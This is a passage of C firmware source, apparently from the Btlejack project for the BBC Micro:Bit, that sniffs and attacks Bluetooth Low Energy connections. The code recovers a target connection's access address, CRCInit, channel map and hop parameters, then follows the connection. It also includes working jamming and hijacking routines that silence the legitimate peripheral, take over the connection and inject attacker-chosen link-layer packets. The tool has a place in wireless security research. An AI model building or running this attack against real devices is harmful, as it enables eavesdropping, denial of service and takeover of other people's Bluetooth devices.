  g_sniffer.sg.initialize(g_sniffer.chm);
  g_sniffer.sg.setHopIncrement(g_sniffer.hop_increment);
  g_sniffer.sg.resetConnection();
  channel = g_sniffer.sg.getNextChannel();

  /* Reset packet and event counters. */
  g_sniffer.conn_evt_counter = 0;
  g_sniffer.conn_evt_pkt_counter = 0;
  g_sniffer.conn_lost_packets = 0;

  /* Next state: sync on first channel. */
  g_sniffer.action = SYNC_CONNECT;
  g_sniffer.synced = false;

  /* Configure radio to wait on first channel. */
  radio_follow_conn(
    g_sniffer.access_address,
    channel,
    g_sniffer.crcinit
  );
}

static void sync_hop_channel(void);

static void sync_lost_track(void)
{
  int i;
  uint32_t remaining;


  /* TODO: switch chm based on instant rather than errors, this should be
           reserved to passive sniffing !                                 */

  g_sniffer.conn_lost_packets++;

  /* We are sniffing but are losing a lot of packets: synchronization failed. */
  if ((g_sniffer.conn_lost_packets >= g_sniffer.max_lost_packets_allowed) && (g_sniffer.action == SYNC_CONNECT))
  {
    /* Send notification. */
    pLink->notifyConnectionLost();

    /* Stop sniffing. */

  }


  /* Jamming successful */
  if ((g_sniffer.conn_lost_packets >= 2) && g_sniffer.hijacking)
  {
    /**
      If we are jamming, that means the master has disconnected and is not
       sending packets anymore. It's time for us to spoof it and take control
       of the connection !
    **/

    /* Stop timers. */
    g_sniffer.ticker.detach();

    /**
      It's all about timing:

      we got notified at (hopInterval-1) twice since we got our last valid packet,
      so we must wait 2*hopInterval before jumping to the next channel + a delta
      we need to apply as we were used to switch to next channel at hopInterval-1.
    **/

    /* Disable radio, do not process anything. */
    radio_disable();
    g_sniffer.jamming = false;
    g_sniffer.hijacking = false;

    /* Compute the remaining time before next anchor. */
    g_sniffer.hj_ticker.detach();
    i = hops/(g_sniffer.hop_interval);
    remaining = (i+1)*g_sniffer.hop_interval - hops;
    //snprintf((char *)hexbuf, 20, "i: %d", remaining);
    //pLink->verbose(hexbuf);

    /* Will reactivate radio later ! */
    g_sniffer.ticker.attach_us(
      start_hijack,
      (remaining*1250 - 360)
    );

    return;
  }

  /* Is there a channel map update to apply ? */
  if ((g_sniffer.action == SYNC_CONNECT) && (g_sniffer.expect_chm_update))
  {
    g_sniffer.ticker.detach();

    /* Copy new channel map to current channel map. */
    for (i=0;i<37;i++)
      g_sniffer.chm[i] = g_sniffer.chm_update[i];

    /* Update sequence generator. */
    g_sniffer.sg.updateChannelMap(g_sniffer.chm);

    /* Update done. */
    g_sniffer.expect_chm_update = false;

    /* Need to synchronize again. */
    g_sniffer.synced = false;

    /* Timeout callback. */
    g_sniffer.ticker.attach_us(
      sync_lost_track,
      (g_sniffer.hop_interval - 1) * 1250
    );

    /* Compute next channel. */
    g_sniffer.channel = g_sniffer.sg.getNextChannel();
    g_sniffer.conn_evt_counter++;
    g_sniffer.conn_evt_pkt_counter = 0;

    /* Go listening on the new channel. */
    NVIC_DisableIRQ(RADIO_IRQn);
    NRF_RADIO->EVENTS_DISABLED = 0;
    NRF_RADIO->TASKS_DISABLE = 1;
    while (NRF_RADIO->EVENTS_DISABLED == 0);

    NRF_RADIO->FREQUENCY = channel_to_freq(g_sniffer.channel);
    NRF_RADIO->DATAWHITEIV = g_sniffer.channel;

    NVIC_ClearPendingIRQ(RADIO_IRQn);
    NVIC_EnableIRQ(RADIO_IRQn);

    // enable receiver
    NRF_RADIO->SHORTS = RADIO_SHORTS_READY_START_Msk;

    // enable receiver (once enabled, it will listen)
    NRF_RADIO->EVENTS_READY = 0;
    NRF_RADIO->EVENTS_END = 0;
    NRF_RADIO->TASKS_RXEN = 1;
  }

#if 0
  else if ((g_sniffer.action == FOLLOW) && (g_sniffer.expect_chm_update))
  {
    /* Copy new channel map to current channel map. */
    for (i=0;i<37;i++)
      g_sniffer.chm[i] = g_sniffer.chm_update[i];

    /* Update sequence generator. */
    g_sniffer.sg.updateChannelMap(g_sniffer.chm);

    /* Update done. */
    g_sniffer.expect_chm_update = false;
  }
#endif

  else {
    //if (!g_sniffer.jamming)
      sync_hop_channel();
  }
}

/**
 * sync_hop_channel()
 *
 * Switch to next channel in sequence and asks for a re-sync.
 **/

static void sync_hop_channel(void)
{
  /* Remove timer. */
  g_sniffer.ticker.detach();

  /* Need to synchronize again. */
  g_sniffer.synced = false;

  /* We expect the master to be first to send a packet. */
  g_sniffer.direction = 0;

  /* Compute next channel. */
  g_sniffer.channel = g_sniffer.sg.getNextChannel();
  g_sniffer.conn_evt_counter++;
  g_sniffer.conn_evt_pkt_counter = 0;

  /* Do we need to update connection parameters ? */
  if (g_sniffer.expect_cp_update && (g_sniffer.cp_update_instant <= g_sniffer.conn_evt_counter))
  {
      /* Update hop interval. */
      g_sniffer.hop_interval = g_sniffer.cp_update_hop_interval;

      /* Update done. */
      g_sniffer.expect_cp_update = false;


      /* Set timeout to hop_interval + transmit_window */
      g_sniffer.ticker.attach_us(
        sync_lost_track,
        (g_sniffer.hop_interval + g_sniffer.conn_transmit_window) * 1250
      );
  } else {

    /* Set timeout to (hop_interval - 1). */
    g_sniffer.ticker.attach_us(
      sync_lost_track,
      (g_sniffer.hop_interval - 1) * 1250
    );
  }

  /* Go listening on the new channel. */
  NVIC_DisableIRQ(RADIO_IRQn);
  NRF_RADIO->EVENTS_DISABLED = 0;
  NRF_RADIO->TASKS_DISABLE = 1;
  while (NRF_RADIO->EVENTS_DISABLED == 0);

  NRF_RADIO->FREQUENCY = channel_to_freq(g_sniffer.channel);
  NRF_RADIO->DATAWHITEIV = g_sniffer.channel;

  NVIC_ClearPendingIRQ(RADIO_IRQn);
  NVIC_EnableIRQ(RADIO_IRQn);

  // enable receiver
  NRF_RADIO->SHORTS = RADIO_SHORTS_READY_START_Msk;

  // enable receiver (once enabled, it will listen)
  NRF_RADIO->EVENTS_READY = 0;
  NRF_RADIO->EVENTS_END = 0;
  NRF_RADIO->TASKS_RXEN = 1;
}


/**
 * set_timer_for_next_anchor()
 *
 * Configure a callback that will be called in (hop_interval - 1)*1250ms. This
 * callback is used to synchronize with Master and optimize sniffing.
 **/

static void set_timer_for_next_anchor(uint16_t interval)
{
  g_sniffer.ticker.detach();
  g_sniffer.hj_ticker.detach();

  g_sniffer.conn_lost_packets = 0;

  /* Sets a timer function to be notified when connInterval is expired. */
  g_sniffer.ticker.attach_us(
    sync_hop_channel,
    //(interval - 1) * 1250
    interval
  );

  hops = 0;
  g_sniffer.hj_ticker.attach_us(hj_sync, 1250);
}

static void hijack_prepare_packet(void)
{
  int i=0;

  /* Do we have a packet to send ? */
  if (g_sniffer.send_pkt)
  {
    /* Copy packet buffer into tx_buffer. */
    for (i=0; i<packet[1]+2; i++)
      tx_buffer[i] = packet[i];

    /* Fix NESN and SN bits. */
    tx_buffer[0] = (tx_buffer[0] & 0xF3) | (g_sniffer.nesn << 2) | (g_sniffer.sn << 3);
  }
  else
  {
    /* Empty PDU into tx_buffer. */
    tx_buffer[0] = 0x01 | (g_sniffer.nesn << 2) | (g_sniffer.sn << 3);
    tx_buffer[1] = 0x00;
  }

}

/**
 * Hopping channel routine for hijack.
 **/

static void hijack_hop_channel(void)
{
  //pLink->verbose(B("HHC"));

  /* Stop timer. */
  g_sniffer.ticker.detach();

  /* Do we face a failure ? */
  if (!g_sniffer.hijacked && (g_sniffer.hj_tries > HIJACK_MAX_TRIES_BEFORE_FAILURE))
  {
    /* We failed at hijacking the connection, notify. */
    pLink->notifyHijackStatus(HIJACK_ERROR);

    /* Stop hijacking. */
    g_sniffer.hijacking = false;
    g_sniffer.jamming = false;

    /* Destroy timer. */
    timer_destroy(g_sniffer.hj_timer);
    g_sniffer.hj_timer = -1;

    /* Reset. */
    reset();

    return;
  }

  /* We expect the master to be first to send a packet. */
  g_sniffer.direction = 0;

  /* Compute next channel. */
  g_sniffer.channel = g_sniffer.sg.getNextChannel();
  g_sniffer.conn_evt_counter++;
  g_sniffer.conn_evt_pkt_counter = 0;

  hijack_prepare_packet();

  /* Mark packet as sent if required. */
  if (g_sniffer.send_pkt && !g_sniffer.pkt_sent)
    g_sniffer.pkt_sent = true;

  /* Let's start hijacking. */
  g_sniffer.action = HIJACK_TX;


  /* Send buffer. */
  radio_send_rx(tx_buffer, 2, g_sniffer.channel);
}



static void chm_tick()
{
    if (g_sniffer.channel < 36)
    {
        /* If channel not used, mark it. */
        if (!is_channel_mapped(g_sniffer.channel))
          pLink->verbose(B("_"));

        /* Tune to next channel. */
        g_sniffer.channel++;
        radio_follow_aa(g_sniffer.access_address, g_sniffer.channel, g_sniffer.crcinit);
    }
    else
    {
        /* We processed all of our channels, stop here. */
        if (!is_channel_mapped(g_sniffer.channel))
          pLink->verbose(B("_"));

        g_sniffer.ticker.detach();

        /* Count mapped channels. */
        g_sniffer.channels_mapped = count_channels();

        /* Notify the channel map. */
        pLink->notifyChannelMap(
          g_sniffer.access_address,
          g_sniffer.chm
        );

        /* Then, try to recover HopInterval. */
        recover_hop_interval();
    }
}

static void cchm_tick(void)
{
  /* Are we done ? */
  if (g_sniffer.channel == (g_sniffer.cchm_stop - 1))
  {
    /* Stop ticker. */
    g_sniffer.ticker.detach();

    /* Notify the channel map. */
    pLink->notifyChannelMap(
      g_sniffer.access_address,
      g_sniffer.chm
    );
  }
  else
  {
    uint8_t msg[5];

    /* Tune to next channel. */
    g_sniffer.channel++;
    snprintf((char *)&msg, 5, "c=%d", g_sniffer.channel);
    pLink->verbose(msg);
    radio_follow_aa(g_sniffer.access_address, g_sniffer.channel, g_sniffer.crcinit);
  }
  pLink->verbose(B("_"));
}

static void recover_chm_next()
{
    if (g_sniffer.channel < 36)
    {
        g_sniffer.ticker.detach();
        //g_sniffer.ticker.attach_us(&chm_tick, 4000000);
        g_sniffer.ticker.attach_us(&chm_tick,/*(unsigned int)g_sniffer.max_interval * 1250*/4000000);
        //g_sniffer.ticker.attach_us(chm_tick,/*(unsigned int)g_sniffer.max_interval * 1250*/4000000);
    }
    chm_tick();
}

static void recover_cchm_next()
{
    if (g_sniffer.channel < (g_sniffer.cchm_stop - 1))
    {
        g_sniffer.ticker.detach();
        //g_sniffer.ticker.attach_us(&chm_tick, 4000000);
        g_sniffer.ticker.attach_us(cchm_tick,/*(unsigned int)g_sniffer.max_interval * 1250*/4000000);
    }
    cchm_tick();
}


static void recover_chm()
{
    int i;

    /* Reset chm. */
    for (i=0;i<37;i++)
        g_sniffer.chm[i] = 0;

    /* We start CHM recovery. */
    g_sniffer.action = RECOVER_CHM;

    /* Set our timer. */
    g_sniffer.channel = 0;
    radio_follow_aa(g_sniffer.access_address, g_sniffer.channel, g_sniffer.crcinit);
    g_sniffer.ticker.attach_us(&chm_tick, /*g_sniffer.max_interval * 1250*/4000000);
}

static void recover_crc(uint32_t access_address)
{
    g_sniffer.action = RECOVER_CRC;
    g_sniffer.n_aa = 0;
    g_sniffer.crcinit = 0;
    g_sniffer.n = 0;
    g_sniffer.access_address = access_address;

    /* Start measuring ticker. */
    measures = 0;
    g_sniffer.last_measure = 0;
    g_sniffer.max_interval = 0;
    g_sniffer.ticker.attach_us(hop_tick, 1250);

    /* We sniff on the last used channel. */
    radio_sniff_aa(access_address, g_sniffer.channel);
}

/**
 * We now have the correct CRCInit and Access Address, let's recover
 * the hop interval.
 **/

static void recover_hop_interval(void)
{
    /* Update state. */
    g_sniffer.action = RECOVER_HOPINTER;
    g_sniffer.observed_interval = 0;
    g_sniffer.smallest_interval = 0xffffffffffffffff;
    g_sniffer.prev_time = 0xffffffff;
    g_sniffer.n = 0;

    /* Initialize sequence generator. */
    g_sniffer.sg.initialize(g_sniffer.chm);
    g_sniffer.channel = g_sniffer.sg.getFirstChannel();

    /* Start measuring. */
    measures = 0;
    g_sniffer.measuring = false;

    /* Reconfigure radio. */
    radio_follow_aa(g_sniffer.access_address, g_sniffer.channel, g_sniffer.crcinit);

}

static void recover_hop_inc(void)
{
    /* switch to Hop increment recovery. */
    g_sniffer.action = RECOVER_HOPINC;
    g_sniffer.ticker.detach();
    g_sniffer.measuring = false;

    /* configure radio and follow AA. */
    g_sniffer.channel = g_sniffer.sg.getFirstChannel();
    radio_follow_aa(g_sniffer.access_address, g_sniffer.channel, g_sniffer.crcinit);
}

static void follow_connection(void)
{
    /* Stop any timer. */
    g_sniffer.ticker.detach();

    /**
     * Max lost packets allowed is very low here, to easily detect bad channel
     * map or hop interval/increment values. Since we may fall by mistake on a
     * used channel (that would reset the lost packets counter), we set up a
     * quite low value to this parameter.
     **/

    g_sniffer.max_lost_packets_allowed = 6;

    /* Reset connection update parameters. */
    g_sniffer.cp_update_instant = 0;
    g_sniffer.cp_update_hop_interval = 0;
    g_sniffer.expect_cp_update = false;

    /* Start from first channel. */
    g_sniffer.sg.prepareToFollow();
    g_sniffer.channel = g_sniffer.sg.getCurrentChannel();

    /* Reset packet and event counters. */
    g_sniffer.conn_evt_counter = 0;
    g_sniffer.conn_evt_pkt_counter = 0;
    g_sniffer.conn_lost_packets = 0;

    /* Next state: sync on first channel. */
    g_sniffer.action = SYNC_CONNECT;
    g_sniffer.synced = false;

    /* Configure radio to wait on first channel. */
    radio_follow_conn(
      g_sniffer.access_address,
      g_sniffer.channel,
      g_sniffer.crcinit
    );
}

static void send_packet(uint8_t *pPacket, int size)
{
  int i = 0;

  if (!g_sniffer.send_pkt)
  {
    /* Copy packet into the tx_buffer. */
    for (i=0; i<size; i++)
      packet[i] = pPacket[i];

    pLink->verbose(B("SP"));

    /* Tell the sniffer we need to send this packet. */
    g_sniffer.send_pkt = true;
    g_sniffer.pkt_sent = false;
  }
  else
  {
    pLink->verbose(B("PS"));
  }
}

/**
 * Start Collaborative Channel Mapping.
 *
 * Collaborative channel mapping is a host-driven procedure aiming at quickly
 * recovering a connection's channel map.
 **/

void start_cchm(uint32_t accessAddress, uint32_t crcInit)
{
  /* Reset sniffer. */
  reset();

  pLink->verbose(B("Starting cchm"));

  /* Populate access address and crcInit */
  g_sniffer.access_address = accessAddress;
  g_sniffer.crcinit = crcInit;
  g_sniffer.channel = g_sniffer.cchm_start;

  /* Switch to CCHM mode. */
  g_sniffer.action = CCHM;

  /* Configure start channel. */
  radio_follow_conn(
    g_sniffer.access_address,
    g_sniffer.channel,
    g_sniffer.crcinit
  );

  g_sniffer.ticker.detach();
  g_sniffer.ticker.attach_us(cchm_tick,/*(unsigned int)g_sniffer.max_interval * 1250*/4000000);

}

void dispatchMessage(T_OPERATION op, uint8_t *payload, int nSize, uint8_t ubflags)
{
  uint32_t accessAddress;
  uint32_t crcInit;
  uint8_t chm[5];
  uint16_t hopInterval;
  int i;

  switch (op)
  {

    /**
     * No data required for RESET.
     **/

    case RESET:
      {
        /* Reset state. */
        reset();

        /* Send command ACK. */
        pLink->sendPacket(RESET, NULL, 0, PKT_COMMAND | PKT_RESPONSE);
      }
      break;

    /**
     * Only support version command.
     **/

    case VERSION:
      {
        if (ubflags & PKT_COMMAND)
        {
          /* Send current version. */
          pLink->version(VERSION_MAJOR, VERSION_MINOR);
        }
        else
        {
          pLink->verbose(B("Version response not supported"));
        }
      }
      break;

    /**
     * List access addresses.
     **/

    case LIST_AA:
      {
        if (ubflags & PKT_COMMAND)
        {
          /* Send ACK. */
          pLink->sendPacket(LIST_AA, NULL, 0, PKT_COMMAND | PKT_RESPONSE);

          /* Start scanning. */
          start_scanning();

        }
        else
        {
          pLink->verbose(B("Version response not supported"));
        }
      }
      break;

    /**
     * Flexible recovery feature
     *
     * One operation to recover:
     * - CRCInit value
     * - Channel map using distributed computing (requires multiple sniffers)
     * - Hop interval and increment and then follow
     *
     * Or simply to directly follow a connection with all the parameters specified.
     *
     * Message format is the following:
     *
     * [04][00][ Access Address (4 bytes) ] -> Recover CRCInit
     * [04][01][ Access Address (4 bytes) ][ CRCInit (3 bytes) ][ Channel Start (1 byte) ][ Channel stop (1 byte)] -> Channel map recovery
     * [04][02][ Access Address (4 bytes) ][ CRCInit (3 bytes) ][ Channel Map (5 bytes) ] -> Hop interval and increment recovery, then follows
     * [04][03][ Access Address (4 bytes) ][ CRCInit (3 bytes) ][ Channel Map (5 bytes) ][ Hop Interval (2 bytes) ][ Hop Increment (1 byte) ] -> Direct follow
     **/

     case RECOVER:
      {
        if ((ubflags & PKT_COMMAND) && (nSize > 1))
        {
          /* Extract type. */
          uint8_t op_type = payload[0];

          switch(op_type)
          {
            /* CRCInit recovery. */
            case 0:
              {
                if (nSize != 5) /* Error, size does not match. */
                  pLink->sendPacket(RECOVER, NULL, 0, 0);
                else
                {
                  /* Extract access address. */
                  accessAddress = payload[1] | (payload[2] << 8) | (payload[3] << 16) | (payload[4] << 24);

                  /* Send ACK. */
                  pLink->sendPacket(RECOVER, NULL, 0, PKT_COMMAND | PKT_RESPONSE);

                  /* Recover parameters. */
                  recover_crcinit(accessAddress);
                }
              }
              break;

            /* Channel map recovery. */
            case 1:
              {
                if (nSize != 10) /* Error, size does not match. */
                  pLink->sendPacket(RECOVER, NULL, 0, 0);
                else
                  {
                    /* Extract access address. */
                    accessAddress = payload[1] | (payload[2] << 8) | (payload[3] << 16) | (payload[4] << 24);
                    crcInit = payload[5] | (payload[6] << 8) | (payload[7] << 16);

                    /* Extract start and end channel */
                    g_sniffer.cchm_start = payload[8];
                    g_sniffer.cchm_stop = payload[9];

                    /* Check values */
                    if ((g_sniffer.cchm_stop > 37) || (g_sniffer.cchm_start > 37))
                    {
                      /* An error occured. */
                      pLink->sendPacket(RECOVER, NULL, 0, 0);
                    }

                    if (g_sniffer.cchm_stop < g_sniffer.cchm_start)
                    {
                      /* An error occured. */
                      pLink->sendPacket(RECOVER, NULL, 0, 0);
                    }

                    /* Enable CCHM mode. */
                    start_cchm(accessAddress, crcInit);

                    /* Send ACK. */
                    pLink->sendPacket(RECOVER, NULL, 0, PKT_COMMAND | PKT_RESPONSE);
                  }
              }
              break;

            /* Hop interval and increment then follows. */
            case 2:
              {
                if (nSize != 13) /* Error, size does not match. */
                  pLink->sendPacket(RECOVER, NULL, 0, 0);
                else
                  {
                    /* Extract access address. */
                    accessAddress = payload[1] | (payload[2] << 8) | (payload[3] << 16) | (payload[4] << 24);
                    crcInit = payload[5] | (payload[6] << 8) | (payload[7] << 16);

                    /* Extract channel map. */
                    for (i=0; i<5; i++)
                      chm[i] = payload[8+i];

                    /* Recover hop interval, then hop increment and follow. */
                    recover_hop(accessAddress, crcInit, chm);

                    /* Send ACK. */
                    pLink->sendPacket(RECOVER, NULL, 0, PKT_COMMAND | PKT_RESPONSE);
                  }

              }
              break;
          }
        }
        else
          /* Error */
          pLink->sendPacket(RECOVER, NULL, 0, 0);
      }
      break;

#if 0
    /**
     * Recover parameters for a specific connection.
     *
     * Payload structure: [AA (4 bytes)]
     **/

    case RECOVER_AA:
      {
        if ((ubflags & PKT_COMMAND) && (nSize == 4))
        {
          /* Extract access adhdress. */
          accessAddress = payload[0] | (payload[1] << 8) | (payload[2] << 16) | (payload[3] << 24);

          /* Send ACK. */
          pLink->sendPacket(RECOVER_AA, NULL, 0, PKT_COMMAND | PKT_RESPONSE);

          /* Recover parameters. */
          recover_connection_parameters(accessAddress);
        }
      }
      break;

    /**
     * Recover parameters for a specific connection, given a channel map.
     *
     * Payload structure: [AA (4 bytes)][ChM (5 bytes)]
     **/

    case RECOVER_AA_CHM:
      {
        /* Extract access address. */
        accessAddress = payload[0] | (payload[1] << 8) | (payload[2] << 16) | (payload[3] << 24);

        /* Extract channel map. */
        for (i=0; i<5; i++)
          chm[i] = payload[4+i];

        /* Send ACK. */
        pLink->sendPacket(RECOVER_AA, NULL, 0, PKT_COMMAND | PKT_RESPONSE);

        /* Recover parameters. */
        recover_connection_parameters(accessAddress, chm);

      }
      break;

    case RECOVER_AA_CHM_HOPINTER:
      {
        /* Extract access address. */
        accessAddress = payload[0] | (payload[1] << 8) | (payload[2] << 16) | (payload[3] << 24);

        /* Extract channel map. */
        for (i=0; i<5; i++)
          chm[i] = payload[4+i];

        /* Extract hop interval. */
        hopInterval = payload[9] | payload[10];

        /* Send ACK. */
        pLink->sendPacket(RECOVER_AA, NULL, 0, PKT_COMMAND | PKT_RESPONSE);

        /* Recover parameters. */
        recover_connection_parameters(accessAddress, chm, hopInterval);
      }
      break;
#endif

    case SNIFF_CONREQ:
      {
        if ((nSize == 7) && (ubflags & PKT_COMMAND))
        {
          /* Extract bd address. */
          g_sniffer.bd_address[0] = payload[0];
          g_sniffer.bd_address[1] = payload[1];
          g_sniffer.bd_address[2] = payload[2];
          g_sniffer.bd_address[3] = payload[3];
          g_sniffer.bd_address[4] = payload[4];
          g_sniffer.bd_address[5] = payload[5];

          /* Send ACK. */
          pLink->sendPacket(SNIFF_CONREQ, NULL, 0, PKT_COMMAND | PKT_RESPONSE);

          /* Start sniffing connection requests. */
          sniff_conn_req(payload[6]);
        }
        else
          pLink->sendPacket(SNIFF_CONREQ, NULL, 0, 0);
      }
      break;

  /* Enable/disable jamming (active when connection following is active)
   *
   * Cause the Micro:Bit to jam an active connection by sending bad packets
   * to the corresponding Central device to make it believe the Peripheral is
   * not correctly responding.
   **/

  case ENABLE_JAMMING:
    {
      if ((nSize == 1) && (ubflags & PKT_COMMAND))
      {
        pLink->sendPacket(ENABLE_JAMMING, NULL, 0, PKT_COMMAND | PKT_RESPONSE);
        g_sniffer.jamming = (payload[0]==1);
      }
      else
        pLink->sendPacket(ENABLE_JAMMING, NULL, 0, 0);
    }
    break;

    /* Enable/disable hijacking (active when connection following is active)
     *
     * Cause the Micro:Bit to jam an active connection by sending bad packets
     * to the corresponding Central device to make it believe the Peripheral is
     * not correctly responding, and taking control of the existing connection.
     **/

    case ENABLE_HIJACKING:
      {
        if ((nSize == 1) && (ubflags & PKT_COMMAND))
        {
          pLink->sendPacket(ENABLE_HIJACKING, NULL, 0, PKT_COMMAND | PKT_RESPONSE);
          g_sniffer.hijacking = (payload[0]==1);
          g_sniffer.jamming = (payload[0]==1);
        }
        else
          pLink->sendPacket(ENABLE_HIJACKING, NULL, 0, 0);
      }
      break;

    /**
     * Send a Bluetooth LL packet if currently hijacking.
     **/

    case SEND_PKT:
      {
        if ((nSize >= 1) && (ubflags & PKT_COMMAND) && g_sniffer.hijacked)
        {
          /* Bufferize packet. */
          send_packet(payload, nSize);

          /* Send ACK. */
          pLink->sendPacket(SEND_PKT, NULL, 0, PKT_COMMAND | PKT_RESPONSE);
        }
        else
          pLink->sendPacket(SEND_PKT, NULL, 0, 0);
      }
      break;

    case COLLAB_CHM:
      {
        if ((nSize == 9) && (ubflags & PKT_COMMAND))
        {

          /* Extract access address. */
          accessAddress = payload[0] | (payload[1] << 8) | (payload[2] << 16) | (payload[3] << 24);
          crcInit = payload[4] | (payload[5] << 8) | (payload[6] << 16);

          /* Extract start and end channel */
          g_sniffer.cchm_start = payload[7];
          g_sniffer.cchm_stop = payload[8];

          /* Check values */
          if ((g_sniffer.cchm_stop > 37) || (g_sniffer.cchm_start > 37))
          {
            /* An error occured. */
            pLink->sendPacket(COLLAB_CHM, NULL, 0, 0);
          }

          if (g_sniffer.cchm_stop < g_sniffer.cchm_start)
          {
            /* An error occured. */
            pLink->sendPacket(COLLAB_CHM, NULL, 0, 0);
          }

          /* Enable CCHM mode. */
          start_cchm(accessAddress, crcInit);

          /* Send ACK. */
          pLink->sendPacket(COLLAB_CHM, NULL, 0, PKT_COMMAND | PKT_RESPONSE);
        }
        else
          pLink->sendPacket(COLLAB_CHM, NULL, 0, 0);
      }
      break;

    /* Other packets. */
    default:
      pLink->verbose(B("DEFAULT"));
      break;
  }
}

int main() {
    T_OPERATION op;
    uint8_t packet[200];
    int nbSize;
    uint8_t flags;

    /* Initalize Micro:Bit and serial link. */
    uBit.init();

#ifdef YOTTA_CFG_TXPIN
  #ifdef YOTTA_CFG_RXPIN
    #pragma message("Btlejack firmware will use custom serial pins")
    uBit.serial.redirect(YOTTA_CFG_TXPIN, YOTTA_CFG_RXPIN);
  #endif
#endif

    pLink = new Link(&uBit);

    /* Init BLE timer. */
    timer_init();

    /* Reset radio and state. */
    reset();

    /* Process serial inquiries. */
    while (1) {
        /* Wait for a packet */
        nbSize = 200;
        if (pLink->readPacket(&op, packet, &nbSize, &flags))
        {
          dispatchMessage(op, packet, nbSize, flags);
        }
        __SEV();
        __WFE();
    }

    /* Done, release fiber. */
    release_fiber();
}
